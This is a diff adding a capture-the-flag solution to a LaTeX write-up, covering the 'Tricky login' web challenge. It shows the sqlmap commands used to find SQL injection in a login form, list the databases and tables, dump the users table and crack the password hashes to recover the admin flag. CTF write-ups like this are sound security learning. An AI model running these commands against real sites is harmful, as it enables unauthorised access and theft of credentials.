@@ -1,7 +1,42 @@
 \section{Web hacking}
 
 \subsection{Unicorn 1 (100p)}
+\newpage
 \subsection{Tricky login (100p)}
+\addtocounter{points}{100}
+Well, this is a tricky login here: 
+\\\url{http://julie2.hackingarena.no:803}
+
+\textbf{Solution:}\\
+When trying to login with the username \texttt{admin} and a random password I noticed that I got a output on the site. This indicated that the site might be vulnerable to an SQL injection.
+
+\begin{center}
+    \includegraphics[width=11cm]{img/Web hacking/Tricky login/Screenshot 2023-11-24 at 16.20.45.png}
+\end{center}
+
+Using sqlmap i tried to check for vulnerabilities with the command \\\texttt{sqlmap -u "http://julie2.hackingarena.no:803" --data="username=admin\&passwd=pass"}
+but that didn't result in anything. So I tried to increase the level of the test with the command 
+\\\texttt{sqlmap -u "http://julie2.hackingarena.no:803" --data="username=admin\&passwd=pass" --level=2} 
+and that resulted in finding a vulnerability in the username field.
+I then ran the command
+\\\texttt{sqlmap -u "http://julie2.hackingarena.no:803" --current-db  --data="username=admin" --tables}
+to find the name of the database and the tables in it. 
+This resulted in the following output:
+
+\begin{center}
+    \includegraphics[width=15cm]{img/Web hacking/Tricky login/Screenshot 2023-11-24 at 16.11.07.png}
+\end{center}
+
+Assuming the users were stored in the database \texttt{user} and the table \texttt{users} I ran the command
+\\\texttt{sqlmap -u "http://julie2.hackingarena.no:803" --current-db  --data="username=admin" --tables -D user -T users --dump}
+to dump the users in the table \texttt{users} in the database \texttt{user}.
+After that I got a prompt asking if I wanted to crack the hashes of the passwords for the users. I proceeded with that and using the default dictionary file from sqlmap I got the following output:
+
+\begin{center}
+    \includegraphics[width=15cm]{img/Web hacking/Tricky login/Screenshot 2023-11-24 at 16.09.41.png}
+\end{center}
+
+The flag was the password for the user \texttt{admin}, which was \texttt{Hacking-Arena\{Query\_chain\_hey\}}.
 
 \newpage
 \subsection{Order a Unicorn (100p)}
